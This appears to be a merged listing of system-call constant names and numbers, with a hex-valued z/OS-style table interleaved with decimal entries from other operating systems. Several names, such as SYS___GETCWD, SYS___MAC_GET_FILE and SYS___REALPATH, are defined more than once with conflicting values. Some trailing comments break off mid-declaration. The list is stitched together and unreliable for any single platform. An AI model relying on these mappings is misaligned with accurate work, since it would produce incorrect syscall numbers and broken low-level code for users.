SYS___CSINL_H                       = 0xA2F
SYS___CSIN_B                        = 0xA28
SYS___CSIN_H                        = 0xA29
SYS___CSNAMETYPE                    = 0x663
SYS___CSNAP                         = 0x0C5
SYS___CSNAP_A                       = 0x7B8
SYS___CSQRTF_B                      = 0xA3D
SYS___CSQRTF_H                      = 0xA3E
SYS___CSQRTL_B                      = 0xA40
SYS___CSQRTL_H                      = 0xA41
SYS___CSQRT_B                       = 0xA3A
SYS___CSQRT_H                       = 0xA3B
SYS___CTANF_B                       = 0xA46
SYS___CTANF_H                       = 0xA47
SYS___CTANHF_B                      = 0xA4F
SYS___CTANHF_H                      = 0xA50
SYS___CTANHL_B                      = 0xA52
SYS___CTANHL_H                      = 0xA53
SYS___CTANH_B                       = 0xA4C
SYS___CTANH_H                       = 0xA4D
SYS___CTANL_B                       = 0xA49
SYS___CTANL_H                       = 0xA4A
SYS___CTAN_B                        = 0xA43
SYS___CTAN_H                        = 0xA44
SYS___CTERMID_A                     = 0x76B
SYS___CTEST                         = 0x0C7
SYS___CTEST_A                       = 0x7B9
SYS___CTIME_A                       = 0x79D
SYS___CTIME_R_A                     = 0x7A2
SYS___CTRACE                        = 0x0C6
SYS___CTRACE_A                      = 0x7BA
SYS___CTTBL                         = 0x517
SYS___CTYPE_INIT_A                  = 0x6AF
SYS___CUSERID_A                     = 0x755
SYS___D1TOP                         = 0xC9B
SYS___D2TOP                         = 0xC9C
SYS___D4TOP                         = 0xC9D
SYS___DBM_OPEN_A                    = 0x7E6
SYS___DEMANGLE                      = 0x154
SYS___DGHT                          = 0x4A8
SYS___DIRNAME_A                     = 0x7DD
SYS___DISABLE_THREADSIGNAL         = 331
SYS___DISCARDDATA                   = 0x5F8
SYS___DLERROR_A                     = 0x8D2
SYS___DLGHT                         = 0x2A1
SYS___DLLLOAD_A                     = 0x6DF
SYS___DLLQUERYFN_A                  = 0x6E0
SYS___DLLQUERYVAR_A                 = 0x6E1
SYS___DLOPEN_A                      = 0x8D0
SYS___DLSYM_A                       = 0x8D1
SYS___DN_COMP_A                     = 0x828
SYS___DN_EXPAND_A                   = 0x826
SYS___DN_FIND_A                     = 0x829
SYS___DN_SKIPNAME_A                 = 0x827
SYS___DSA_PREV                      = 0x5B2
SYS___DYNALL                        = 0x0C3
SYS___DYNALLOC_A                    = 0x81F
SYS___DYNFRE                        = 0x0C2
SYS___DYNFREE_A                     = 0x820
SYS___E2A_L                         = 0x6E3
SYS___E2A_S                         = 0x691
SYS___ECRTRM                        = 0x2B1
SYS___ECVT_A                        = 0x70D
SYS___ENVN                          = 0x4B0
SYS___ENVNA                         = 0x78F
SYS___EP_FIND                       = 0x5B3
SYS___ERFCF_B                       = 0x86D
SYS___ERFCF_H                       = 0x909
SYS___ERFCL_B                       = 0x811
SYS___ERFCL_H                       = 0x90A
SYS___ERFC_B                        = 0x4C5
SYS___ERFC_H                        = 0x908
SYS___ERFF_B                        = 0x86C
SYS___ERFF_H                        = 0x906
SYS___ERFL_B                        = 0x810
SYS___ERFL_H                        = 0x907
SYS___ERF_B                         = 0x4C4
SYS___ERF_H                         = 0x905
SYS___ERR2AD                        = 0x16C
SYS___ERRNO                         = 0x156
SYS___ERRNO2                        = 0x157
SYS___ETOA                          = 0x2DD
SYS___ETOA_L                        = 0x2DE
SYS___EXECLE_A                      = 0x6A0
SYS___EXECLP_A                      = 0x6A4
SYS___EXECL_A                       = 0x694
SYS___EXECVE_A                      = 0x6C1
SYS___EXECVP_A                      = 0x6C2
SYS___EXECV_A                       = 0x6B1
SYS___EXP2F_B                       = 0x850
SYS___EXP2F_H                       = 0xA5E
SYS___EXP2L_B                       = 0x851
SYS___EXP2L_H                       = 0xA5F
SYS___EXP2_B                        = 0x89D
SYS___EXP2_H                        = 0xA5D
SYS___EXPF_B                        = 0x61E
SYS___EXPF_H                        = 0x90C
SYS___EXPL_B                        = 0x61F
SYS___EXPL_H                        = 0x90D
SYS___EXPM1F_B                      = 0x852
SYS___EXPM1F_H                      = 0xA5B
SYS___EXPM1L_B                      = 0x853
SYS___EXPM1L_H                      = 0xA5C
SYS___EXPM1_B                       = 0x4C6
SYS___EXPM1_H                       = 0x90E
SYS___EXP_B                         = 0x4DF
SYS___EXP_H                         = 0x90B
SYS___EXTLINK_NP_A                  = 0x730
SYS___FABSF_B                       = 0x608
SYS___FABSF_H                       = 0x7FA
SYS___FABSL_B                       = 0x609
SYS___FABSL_H                       = 0x7FB
SYS___FABS_B                        = 0x4C7
SYS___FABS_H                        = 0x7ED
SYS___FAR_JUMP                      = 0x89F
SYS___FBUFSIZE                      = 0xD60
SYS___FCHATTR                       = 0x661
SYS___FCVT_A                        = 0x70E
SYS___FDIMF_B                       = 0x854
SYS___FDIMF_H                       = 0x910
SYS___FDIML_B                       = 0x856
SYS___FDIML_H                       = 0x911
SYS___FDIM_B                        = 0x855
SYS___FDIM_H                        = 0x90F
SYS___FDLREC                        = 0x247
SYS___FDOPEN_A                      = 0x74E
SYS___FETCH                         = 0x248
SYS___FETCH_A                       = 0x713
SYS___FGETS_A                       = 0x787
SYS___FGETWC_A                      = 0x7AA
SYS___FGETWS_A                      = 0x7AD
SYS___FLBF                          = 0xD62
SYS___FLDATA                        = 0x0C1
SYS___FLDATA_A                      = 0x74F
SYS___FLOCT                         = 0x246
SYS___FLOORF_B                      = 0x60A
SYS___FLOORF_H                      = 0x7F6
SYS___FLOORL_B                      = 0x60B
SYS___FLOORL_H                      = 0x7F7
SYS___FLOOR_B                       = 0x4C9
SYS___FLOOR_H                       = 0x7EB
SYS___FMAF_B                        = 0xA67
SYS___FMAF_H                        = 0xA68
SYS___FMAL_B                        = 0xA6A
SYS___FMAL_H                        = 0xA6B
SYS___FMAXF_B                       = 0xA70
SYS___FMAXF_H                       = 0xA71
SYS___FMAXL_B                       = 0xA73
SYS___FMAXL_H                       = 0xA74
SYS___FMAX_B                        = 0xA6D
SYS___FMAX_H                        = 0xA6E
SYS___FMA_B                         = 0xA64
SYS___FMA_H                         = 0xA65
SYS___FMINF_B                       = 0xA79
SYS___FMINF_H                       = 0xA7A
SYS___FMINL_B                       = 0xA7C
SYS___FMINL_H                       = 0xA7D
SYS___FMIN_B                        = 0xA76
SYS___FMIN_H                        = 0xA77
SYS___FMODF_B                       = 0x62D
SYS___FMODF_H                       = 0x913
SYS___FMODL_B                       = 0x62E
SYS___FMODL_H                       = 0x914
SYS___FMOD_B                        = 0x4E0
SYS___FMOD_H                        = 0x912
SYS___FMTMSG_A                      = 0x76C
SYS___FNMATCH_A                     = 0x692
SYS___FNMATCH_C_A                   = 0x693
SYS___FNMATCH_STD_A                 = 0x695
SYS___FNWSA                         = 0x49B
SYS___FOPEN_A                       = 0x753
SYS___FPC_RD                        = 0x528
SYS___FPC_RS                        = 0x52C
SYS___FPC_RW                        = 0x52A
SYS___FPC_SM                        = 0x52B
SYS___FPC_WR                        = 0x529
SYS___FPENDING                      = 0xD61
SYS___FPENDING_UNLOCKED             = 0xD6C
SYS___FPRINTF_A                     = 0x6FA
SYS___FPURGE                        = 0xD69
SYS___FPURGE_UNLOCKED               = 0xD70
SYS___FPUTC_A                       = 0x784
SYS___FPUTS_A                       = 0x789
SYS___FPUTWC                        = 0x400
SYS___FPUTWC_A                      = 0x7A5
SYS___FPUTWS_A                      = 0x7A8
SYS___FP_BTOH                       = 0x526
SYS___FP_CAST                       = 0x501
SYS___FP_CAST_D                     = 0xBCB
SYS___FP_CLASS                      = 0x51D
SYS___FP_CLR_FLAG                   = 0x51A
SYS___FP_FINITE                     = 0x51E
SYS___FP_HTOB                       = 0x527
SYS___FP_ISNAN                      = 0x51F
SYS___FP_LEVEL                      = 0x525
SYS___FP_RAISE_XCP                  = 0x51C
SYS___FP_READ_FLAG                  = 0x51B
SYS___FP_READ_RND                   = 0x521
SYS___FP_READ_RND_B                 = 0x522
SYS___FP_SETMODE                    = 0x4F8
SYS___FP_SWAPMODE                   = 0x5AF
SYS___FP_SWAP_RND                   = 0x523
SYS___FP_SWAP_RND_B                 = 0x524
SYS___FP_UNORDERED                  = 0x520
SYS___FREADABLE                     = 0xD63
SYS___FREADAHEAD                    = 0xD6A
SYS___FREADAHEAD_UNLOCKED           = 0xD71
SYS___FREADING                      = 0xD65
SYS___FREADING_UNLOCKED             = 0xD6D
SYS___FREAD_A                       = 0x78A
SYS___FREOPEN_A                     = 0x754
SYS___FREXPF_B                      = 0x60C
SYS___FREXPL_B                      = 0x60D
SYS___FREXP_B                       = 0x4CA
SYS___FSCANF_A                      = 0x701
SYS___FSEEK2                        = 0xB3C
SYS___FSETERR                       = 0xD6B
SYS___FSETLOCKING                   = 0xD67
SYS___FTCHEP                        = 0x0BF
SYS___FTELL2                        = 0xB3B
SYS___FTOK_A                        = 0x74C
SYS___FTW_A                         = 0x758
SYS___FUPDT                         = 0x0B5
SYS___FWRITABLE                     = 0xD64
SYS___FWRITE_A                      = 0x78B
SYS___FWRITING                      = 0xD66
SYS___FWRITING_UNLOCKED             = 0xD6E
SYS___GAI_STRERROR_A                = 0x72F
SYS___GAMMA_B                       = 0x4E1
SYS___GAMMA_H                       = 0x915
SYS___GCVT_A                        = 0x70F
SYS___GDERR                         = 0x29F
SYS___GDRR                          = 0x4A1
SYS___GDTRM                         = 0x2AA
SYS___GETADDRINFO_A                 = 0x6BF
SYS___GETCB                         = 0x0B4
SYS___GETCLIENTID                   = 0x471
SYS___GETCWD                 = 326 // { int __getcwd(char 
SYS___GETCWD               = 326 // { int __getcwd(u_char 
SYS___GETCWD             = 296 // { int
SYS___GETCWD       = 304 // { int sys___getcwd(char 
SYS___GETCWD_A                      = 0x723
SYS___GETDATE_A                     = 0x79E
SYS___GETENV                        = 0x26F
SYS___GETENV_A                      = 0x714
SYS___GETGRENT_A                    = 0x759
SYS___GETGRGID1                     = 0xD5B
SYS___GETGRGID_A                    = 0x75A
SYS___GETGRGID_R_A                  = 0x67D
SYS___GETGRNAM1                     = 0xD5C
SYS___GETGRNAM_A                    = 0x75B
SYS___GETGRNAM_R_A                  = 0x689
SYS___GETGROUPSBYNAME_A             = 0x75C
SYS___GETHOSTBYADDR_A               = 0x669
SYS___GETHOSTBYADDR_R_A             = 0x66C
SYS___GETHOSTBYNAME_A               = 0x66A
SYS___GETHOSTBYNAME_R_A             = 0x66D
SYS___GETHOSTENT_A                  = 0x75D
SYS___GETHOSTNAME_A                 = 0x75E
SYS___GETIPC                        = 0x281
SYS___GETLOGIN           = 49  // { int
SYS___GETLOGIN_A                    = 0x75F
SYS___GETLOGIN_R_A                  = 0x68E
SYS___GETNAMEINFO_A                 = 0x6C4
SYS___GETNETBYADDR_A                = 0x793
SYS___GETNETBYNAME_A                = 0x794
SYS___GETNETENT_A                   = 0x795
SYS___GETOPT_A                      = 0x71D
SYS___GETPASS_A                     = 0x761
SYS___GETPEERNAME_A                 = 0x836
SYS___GETPROTOBYNAME_A              = 0x796
SYS___GETPROTOBYNUMBER_A            = 0x797
SYS___GETPROTOENT_A                 = 0x798
SYS___GETPWENT_A                    = 0x762
SYS___GETPWNAM_A                    = 0x763
SYS___GETPWNAM_R_A                  = 0x68C
SYS___GETPWUID_A                    = 0x764
SYS___GETPWUID_R_A                  = 0x68D
SYS___GETSERVBYNAME_A               = 0x799
SYS___GETSERVBYPORT_A               = 0x79A
SYS___GETSERVENT_A                  = 0x79B
SYS___GETSOCKNAME_A                 = 0x837
SYS___GETS_A                        = 0x788
SYS___GETTHENT                      = 0xCE5
SYS___GETTIMEOFDAY_A                = 0x7AE
SYS___GETTOD                        = 0xD3E
SYS___GETUSERID                     = 0x5AB
SYS___GETUTXENT_A                   = 0x8C6
SYS___GETUTXID_A                    = 0x8C7
SYS___GETUTXLINE_A                  = 0x8C8
SYS___GETWCHAR_A                    = 0x7AC
SYS___GETWC_A                       = 0x7AB
SYS___GETWD_A                       = 0x724
SYS___GET_CPUID                     = 0x5B9
SYS___GET_SYSTEM_SETTINGS           = 0x5BA
SYS___GET_TCB      = 330 // { void 
SYS___GET_WCTYPE_STD_A              = 0x6AE
SYS___GLOB_A                        = 0x7DE
SYS___GMTIME_A                      = 0x7AF
SYS___GMTIME_R_A                    = 0x7B0
SYS___HEAPRPT                       = 0x496
SYS___HRRNO                         = 0x4A2
SYS___HYPOTF_B                      = 0x857
SYS___HYPOTF_H                      = 0xAF6
SYS___HYPOTL_B                      = 0x858
SYS___HYPOTL_H                      = 0xAF7
SYS___HYPOT_B                       = 0x4E3
SYS___HYPOT_H                       = 0x916
SYS___H_ERRNO                       = 0x36F
SYS___ICONV_OPEN_A                  = 0x6DE
SYS___IF_INDEXTONAME_A              = 0x6DC
SYS___IF_NAMEINDEX_A                = 0x728
SYS___IF_NAMETOINDEX_A              = 0x6DB
SYS___ILOGBF_B                      = 0xA7F
SYS___ILOGBF_H                      = 0xA80
SYS___ILOGBL_B                      = 0xA82
SYS___ILOGBL_H                      = 0xA83
SYS___ILOGB_B                       = 0x4CB
SYS___ILOGB_H                       = 0x917
SYS___INET_ADDR_A                   = 0x82F
SYS___INET_NETWORK_A                = 0x831
SYS___INET_NTOA_A                   = 0x830
SYS___INET_NTOP_A                   = 0x760
SYS___INET_PTON_A                   = 0x7BC
SYS___INITGROUPS_A                  = 0x76D
SYS___IPDBCS                        = 0x38D
SYS___IPDOMAINNAME                  = 0x5AC
SYS___IPDSPX                        = 0x38E
SYS___IPHOST                        = 0x48B
SYS___IPMSGC                        = 0x38F
SYS___IPNODE                        = 0x48C
SYS___IPTCPN                        = 0x489
SYS___ISALNUM_A                     = 0x731
SYS___ISALPHA_A                     = 0x732
SYS___ISASCII                       = 0x78D
SYS___ISASCII2                      = 0x382
SYS___ISBFP                         = 0x500
SYS___ISBLANK_A                     = 0xB2E
SYS___ISBLNK                        = 0x0FE
SYS___ISCNTRL_A                     = 0x734
SYS___ISDIGIT_A                     = 0x735
SYS___ISGRAPH_A                     = 0x736
SYS___ISLOWER_A                     = 0x737
SYS___ISNAN_B                       = 0x4CC
SYS___ISPOSIXON                     = 0x42E
SYS___ISPRINT_A                     = 0x738
SYS___ISPUNCT_A                     = 0x739
SYS___ISSPACE_A                     = 0x73A
SYS___ISUPPER_A                     = 0x73B
SYS___ISWALNUM_A                    = 0x73F
SYS___ISWALPHA_A                    = 0x740
SYS___ISWBLANK_A                    = 0xB2F
SYS___ISWBLK                        = 0x101
SYS___ISWCNTRL_A                    = 0x742
SYS___ISWCTYPE_A                    = 0x6B0
SYS___ISWDIGIT_A                    = 0x743
SYS___ISWGRAPH_A                    = 0x744
SYS___ISWLOWER_A                    = 0x745
SYS___ISWPRINT_A                    = 0x746
SYS___ISWPUNCT_A                    = 0x747
SYS___ISWSPACE_A                    = 0x748
SYS___ISWUPPER_A                    = 0x749
SYS___ISWXDIGIT_A                   = 0x74A
SYS___ISXDIGIT_A                    = 0x73C
SYS___IS_WCTYPE_STD_A               = 0x6B2
SYS___ITOA                          = 0x8AA
SYS___ITOA_A                        = 0x8B0
SYS___J0_B                          = 0x4E4
SYS___J0_H                          = 0x7EE
SYS___J1_B                          = 0x4E6
SYS___J1_H                          = 0x7EF
SYS___JN_B                          = 0x4E8
SYS___JN_H                          = 0x7F0
SYS___L64A_A                        = 0x710
SYS___LCHATTR                       = 0x840
SYS___LCHOWN_A                      = 0x725
SYS___LDEXPF_B                      = 0x60E
SYS___LDEXPL_B                      = 0x60F
SYS___LDEXP_B                       = 0x4CD
SYS___LE_CEEGTJS                    = 0xD72
SYS___LE_CIB_GET                    = 0x83E
SYS___LE_CONDITION_TOKEN_BUILD      = 0x8A5
SYS___LE_DEBUG_SET_RESUME_MCH       = 0x943
SYS___LE_MSG_ADD_INSERT             = 0x8A6
SYS___LE_MSG_GET                    = 0x8A7
SYS___LE_MSG_GET_AND_WRITE          = 0x8A8
SYS___LE_MSG_WRITE                  = 0x8A9
SYS___LE_TRACEBACK                  = 0xB7A
SYS___LGAMMAF_B                     = 0x869
SYS___LGAMMAF_H                     = 0x919
SYS___LGAMMAL_B                     = 0x812
SYS___LGAMMAL_H                     = 0xA62
SYS___LGAMMA_B                      = 0x4EA
SYS___LGAMMA_B_C99                  = 0xB39
SYS___LGAMMA_H                      = 0x918
SYS___LGAMMA_H_C99                  = 0xB38
SYS___LGAMMA_R_C99                  = 0xB3A
SYS___LIBREL                        = 0x244
SYS___LINK_A                        = 0x726
SYS___LLRINTF_B                     = 0xA88
SYS___LLRINTF_H                     = 0xA89
SYS___LLRINTL_B                     = 0xA8B
SYS___LLRINTL_H                     = 0xA8C
SYS___LLRINT_B                      = 0xA85
SYS___LLRINT_H                      = 0xA86
SYS___LLROUNDF_B                    = 0xA91
SYS___LLROUNDF_H                    = 0xA92
SYS___LLROUNDL_B                    = 0xA94
SYS___LLROUNDL_H                    = 0xA95
SYS___LLROUND_B                     = 0xA8E
SYS___LLROUND_H                     = 0xA8F
SYS___LLTOA                         = 0x8AE
SYS___LLTOA_A                       = 0x8B4
SYS___LOCALECONV_A                  = 0x6B8
SYS___LOCALECONV_STD_A              = 0x6B9
SYS___LOCALE_CTL                    = 0xD47
SYS___LOCALE_INIT_A                 = 0x6B7
SYS___LOCALTIME_A                   = 0x7B1
SYS___LOCALTIME_R_A                 = 0x7B2
SYS___LOG10F_B                      = 0x622
SYS___LOG10F_H                      = 0x923
SYS___LOG10L_B                      = 0x623
SYS___LOG10L_H                      = 0x924
SYS___LOG10_B                       = 0x4ED
SYS___LOG10_H                       = 0x922
SYS___LOG1PF_B                      = 0x859
SYS___LOG1PF_H                      = 0xA60
SYS___LOG1PL_B                      = 0x85A
SYS___LOG1PL_H                      = 0xA61
SYS___LOG1P_B                       = 0x4CE
SYS___LOG1P_H                       = 0x921
SYS___LOG2F_B                       = 0x85B
SYS___LOG2F_H                       = 0x91F
SYS___LOG2L_B                       = 0x85D
SYS___LOG2L_H                       = 0x920
SYS___LOG2_B                        = 0x85C
SYS___LOG2_H                        = 0x91E
SYS___LOGBF_B                       = 0xA97
SYS___LOGBF_H                       = 0xA98
SYS___LOGBL_B                       = 0xA9A
SYS___LOGBL_H                       = 0xA9B
SYS___LOGB_B                        = 0x4CF
SYS___LOGB_H                        = 0x91D
SYS___LOGF_B                        = 0x620
SYS___LOGF_H                        = 0x91B
SYS___LOGIN                         = 0x4F5
SYS___LOGIN_APPLID                  = 0xCE2
SYS___LOGL_B                        = 0x621
SYS___LOGL_H                        = 0x91C
SYS___LOG_B                         = 0x4EC
SYS___LOG_H                         = 0x91A
SYS___LRINTF_B                      = 0xAA0
SYS___LRINTF_H                      = 0xAA1
SYS___LRINTL_B                      = 0xAA3
SYS___LRINTL_H                      = 0xAA4
SYS___LRINT_B                       = 0xA9D
SYS___LRINT_H                       = 0xA9E
SYS___LROUNDF_B                     = 0x86A
SYS___LROUNDF_FIXUP                 = 0xB31
SYS___LROUNDF_H                     = 0x926
SYS___LROUNDL_B                     = 0xAA6
SYS___LROUNDL_H                     = 0xAA7
SYS___LROUND_B                      = 0x86B
SYS___LROUND_FIXUP                  = 0xB30
SYS___LROUND_H                      = 0x925
SYS___LSTAT_A                       = 0x6EE
SYS___LSTAT_O_A                     = 0x6EF
SYS___LTOA                          = 0x8AC
SYS___LTOA_A                        = 0x8B2
SYS___MACH_BRIDGE_REMOTE_TIME      = 531
SYS___MAC_EXECVE                   = 380
SYS___MAC_EXECVE             = 415 // { int __mac_execve(char 
SYS___MAC_GETFSSTAT                = 426
SYS___MAC_GET_FD                   = 388
SYS___MAC_GET_FILE                 = 382
SYS___MAC_GET_FILE           = 387 // { int __mac_get_file(const char 
SYS___MAC_GET_LINK                 = 384
SYS___MAC_GET_LINK           = 410 // { int __mac_get_link(const char 
SYS___MAC_GET_MOUNT                = 425
SYS___MAC_GET_PID                  = 390
SYS___MAC_GET_PROC                 = 386
SYS___MAC_GET_PROC           = 384 // { int __mac_get_proc(struct mac 
SYS___MAC_MOUNT                    = 424
SYS___MAC_SET_FD                   = 389
SYS___MAC_SET_FILE                 = 383
SYS___MAC_SET_FILE           = 389 // { int __mac_set_file(const char 
SYS___MAC_SET_LINK                 = 385
SYS___MAC_SET_LINK           = 411 // { int __mac_set_link(const char 
SYS___MAC_SET_PROC                 = 387
SYS___MAC_SET_PROC           = 385 // { int __mac_set_proc(struct mac 
SYS___MAC_SYSCALL                  = 381
SYS___MALLOC24                      = 0x7FC
SYS___MALLOC31                      = 0x7FD
SYS___MAP_INIT                      = 0x5A7
SYS___MAP_SERVICE                   = 0x5A8
SYS___MBLEN_A                       = 0x66F
SYS___MBLEN_SB_A                    = 0x670
SYS___MBLEN_STD_A                   = 0x671
SYS___MBLEN_UTF                     = 0x672
SYS___MBSTOWCS_A                    = 0x673
SYS___MBSTOWCS_STD_A                = 0x674
SYS___MBTOWC_A                      = 0x675
SYS___MBTOWC_ISO1                   = 0x676
SYS___MBTOWC_MBCS                   = 0x678
SYS___MBTOWC_SBCS                   = 0x677
SYS___MBTOWC_UTF                    = 0x679
SYS___MKDIR_A                       = 0x6E9
SYS___MKFIFO_A                      = 0x6EC
SYS___MKNOD_A                       = 0x6F0
SYS___MKSTEMP_A                     = 0x717
SYS___MKTEMP_A                      = 0x74D
SYS___MKTIME_A                      = 0x7B3
SYS___MLOCKALL                      = 0x4B1
SYS___MODFF_B                       = 0x62F
SYS___MODFF_H                       = 0x7F8
SYS___MODFL_B                       = 0x630
SYS___MODFL_H                       = 0x7F9
SYS___MODF_B                        = 0x4D1
SYS___MODF_H                        = 0x7EC
SYS___MONETARY_INIT_A               = 0x6BC
SYS___MOSERVICES                    = 0xD3D
SYS___MOUNT                         = 0x5AA
SYS___MOUNT_A                       = 0x6F1
SYS___MSGRCV_A                      = 0x76F
SYS___MSGRCV_TIMED                  = 0x5B7
SYS___MSGSND_A                      = 0x770
SYS___MSGXR                         = 0x279
SYS___MSGXRCV_A                     = 0x771
SYS___MUST_STAY_CLEAN               = 0xB7C
SYS___NANF_B                        = 0xAAB
SYS___NANL_B                        = 0xAAD
SYS___NAN_B                         = 0xAA9
SYS___NDMTRM                        = 0x300
SYS___NEARBYINTF_B                  = 0xAB2
SYS___NEARBYINTF_H                  = 0xAB3
SYS___NEARBYINTL_B                  = 0xAB5
SYS___NEARBYINTL_H                  = 0xAB6
SYS___NEARBYINT_B                   = 0xAAF
SYS___NEARBYINT_H                   = 0xAB0
SYS___NEXTAFTERF_B                  = 0xAB8
SYS___NEXTAFTERF_H                  = 0xAB9
SYS___NEXTAFTERL_B                  = 0xABB
SYS___NEXTAFTERL_H                  = 0xABC
SYS___NEXTAFTER_B                   = 0x4D2
SYS___NEXTAFTER_H                   = 0x927
SYS___NEXTTOWARDF_B                 = 0xAC1
SYS___NEXTTOWARDF_H                 = 0xAC2
SYS___NEXTTOWARDL_B                 = 0xAC4
SYS___NEXTTOWARDL_H                 = 0xAC5
SYS___NEXTTOWARD_B                  = 0xABE
SYS___NEXTTOWARD_H                  = 0xABF
SYS___NEXUS_CREATE                 = 506
SYS___NEXUS_DEREGISTER             = 505
SYS___NEXUS_DESTROY                = 507
SYS___NEXUS_GET_OPT                = 508
SYS___NEXUS_OPEN                   = 503
SYS___NEXUS_REGISTER               = 504
SYS___NEXUS_SET_OPT                = 509
SYS___NFTW_A                        = 0x772
SYS___NLIST_A                       = 0x82A
SYS___NL_CSINFO_A                   = 0x6D6
SYS___NL_LANGINFO_A                 = 0x6BA
SYS___NL_LNAGINFO_STD_A             = 0x6BB
SYS___NL_MONINFO_A                  = 0x6D7
SYS___NL_NUMINFO_A                  = 0x6D8
SYS___NL_RESPINFO_A                 = 0x6D9
SYS___NL_TIMINFO_A                  = 0x6DA
SYS___NUMERIC_INIT_A                = 0x6C6
SYS___OCLCK                         = 0x2DA
SYS___OLD_SEMWAIT_SIGNAL           = 370
SYS___OLD_SEMWAIT_SIGNAL_NOCANCEL  = 371
SYS___OPARGF                        = 0x2A2
SYS___OPENDIR2                      = 0x4F3
SYS___OPENDIR_A                     = 0x7C2
SYS___OPENMVSREL                    = 0x42F
SYS___OPENVMREL                     = 0x394
SYS___OPEN_A                        = 0x6F7
SYS___OPEN_O_A                      = 0x78C
SYS___OPEN_STAT                     = 0x4F6
SYS___OPERRF                        = 0x2A5
SYS___OPINDF                        = 0x2A4
SYS___OPND                          = 0x4A5
SYS___OPOPTF                        = 0x2A3
SYS___OPPT                          = 0x4A6
SYS___OPRG                          = 0x4A3
SYS___OPRR                          = 0x4A4
SYS___OSENV                         = 0x59F
SYS___OSNAME                        = 0x7E0
SYS___O_ENV                         = 0xB7D
SYS___PASSWD                        = 0x216
SYS___PASSWD_APPLID                 = 0xCE3
SYS___PATHCONF_A                    = 0x727
SYS___PERROR_A                      = 0x712
SYS___PID_AFFINITY                  = 0x4BD
SYS___POE                           = 0x81D
SYS___POPEN_A                       = 0x756
SYS___POSIX_CHOWN        = 283 // { int
SYS___POSIX_FCHOWN       = 284 // { int
SYS___POSIX_LCHOWN       = 285 // { int
SYS___POSIX_RENAME       = 270 // { int
SYS___POWF_B                        = 0x624
SYS___POWF_H                        = 0x929
SYS___POWL_B                        = 0x625
SYS___POWL_H                        = 0x92A
SYS___POW_B                         = 0x4EE
SYS___POW_H                         = 0x928
SYS___POW_I                         = 0x987
SYS___POW_II                        = 0x98A
SYS___POW_II_B                      = 0x98B
SYS___POW_II_H                      = 0x98C
SYS___POW_I_B                       = 0x988
SYS___POW_I_H                       = 0x989
SYS___PRINTF_A                      = 0x6DD
SYS___PTHREAD_CANCELED             = 333
SYS___PTHREAD_CHDIR                = 348
SYS___PTHREAD_FCHDIR               = 349
SYS___PTHREAD_KILL                 = 328
SYS___PTHREAD_MARKCANCEL           = 332
SYS___PTHREAD_SECURITY_NP_A         = 0x774
SYS___PTHREAD_SIGMASK              = 329
SYS___PTOD1                         = 0xC9E
SYS___PTOD2                         = 0xC9F
SYS___PTOD4                         = 0xCA0
SYS___PTSNAME_A                     = 0x718
SYS___PUTCHAR_A                     = 0x785
SYS___PUTCHAR_UNLOCKED_A            = 0x8CC
SYS___PUTC_A                        = 0x790
SYS___PUTC_UNLOCKED_A               = 0x8CB
SYS___PUTENV_A                      = 0x719
SYS___PUTS_A                        = 0x786
SYS___PUTUTXLINE_A                  = 0x8C9
SYS___PUTWC                         = 0x401
SYS___PUTWCHAR_A                    = 0x7A7
SYS___PUTWC_A                       = 0x7A6
SYS___PWCHAR                        = 0x402
SYS___QUERYMETRICS_A                = 0x775
SYS___QUERYSCHENV                   = 0x776
SYS___QUOTACTL           = 473 // { int
SYS___READDIR2                      = 0x4F4
SYS___READDIR_A                     = 0x7C3
SYS___READDIR_R_A                   = 0x690
SYS___READLINK_A                    = 0x729
SYS___READV_A                       = 0x777
SYS___REALPATH             = 551 // { ssize_t __realpath(const char 
SYS___REALPATH     = 115 // { int sys___realpath(const char 
SYS___REALPATH_A                    = 0x71A
SYS___RECVFROM_A                    = 0x838
SYS___RECVMSG2                      = 0x425
SYS___RECVMSG_A                     = 0x83B
SYS___REGCOMP_A                     = 0x696
SYS___REGCOMP_STD                   = 0x0EA
SYS___REGCOMP_STD_A                 = 0x697
SYS___REGERROR_A                    = 0x698
SYS___REGERROR_STD_A                = 0x699
SYS___REGEXEC_A                     = 0x69A
SYS___REGEXEC_STD_A                 = 0x69B
SYS___REGFREE_A                     = 0x69C
SYS___REGFREE_STD_A                 = 0x69D
SYS___REMAINDERF_B                  = 0x85E
SYS___REMAINDERF_H                  = 0xAC6
SYS___REMAINDERL_B                  = 0x85F
SYS___REMAINDERL_H                  = 0xAC7
SYS___REMAINDER_B                   = 0x4EF
SYS___REMAINDER_H                   = 0x92B
SYS___REMOVE_A                      = 0x750
SYS___REMQUOD128                    = 0xC10
SYS___REMQUOD32                     = 0xC0E
SYS___REMQUOD64                     = 0xC0F
SYS___REMQUOF_B                     = 0x860
SYS___REMQUOF_H                     = 0xAC9
SYS___REMQUOL_B                     = 0x862
SYS___REMQUOL_H                     = 0xACA
SYS___REMQUO_B                      = 0x861
SYS___REMQUO_H                      = 0xAC8
SYS___RENAME_A                      = 0x751
SYS___RES                           = 0x5D6
SYS___RESET_EXCEPTION_HANDLER       = 0x8E3
SYS___RESP_INIT_A                   = 0x6C7
SYS___RES_INIT_A                    = 0x66B
SYS___RES_MKQUERY_A                 = 0x824
SYS___RES_QUERYDOMAIN_A             = 0x823
SYS___RES_QUERY_A                   = 0x821
SYS___RES_SEARCH_A                  = 0x822
SYS___RES_SEND_A                    = 0x825
SYS___RETHROW                       = 0x25F
SYS___REXEC_A                       = 0x8C4
SYS___REXEC_AF_A                    = 0x8C5
SYS___RINTF_B                       = 0xACC
SYS___RINTL_B                       = 0xACE
SYS___RINT_B                        = 0x4D3
SYS___RINT_H                        = 0x92C
SYS___RLSE                          = 0x245
SYS___RMDIR_A                       = 0x72A
SYS___RNDTRM                        = 0x2AB
SYS___ROUNDF_B                      = 0xAD3
SYS___ROUNDF_H                      = 0xAD4
SYS___ROUNDL_B                      = 0xAD6
SYS___ROUNDL_H                      = 0xAD7
SYS___ROUND_B                       = 0xAD0
SYS___ROUND_H                       = 0xAD1
SYS___RPMATCH_A                     = 0x6C8
SYS___RPMATCH_C_A                   = 0x6C9
SYS___RPMATCH_STD_A                 = 0x6CA
SYS___RPMTCH                        = 0x11A
SYS___SCALBLNF_B                    = 0xADC
SYS___SCALBLNF_H                    = 0xADD
SYS___SCALBLNL_B                    = 0xADF
SYS___SCALBLNL_H                    = 0xAE0
SYS___SCALBLN_B                     = 0xAD9
SYS___SCALBLN_H                     = 0xADA
SYS___SCALBNF_B                     = 0xAE4
SYS___SCALBNF_H                     = 0xAE5
SYS___SCALBNL_B                     = 0xAE7
SYS___SCALBNL_H                     = 0xAE8
SYS___SCALBN_B                      = 0xAE1
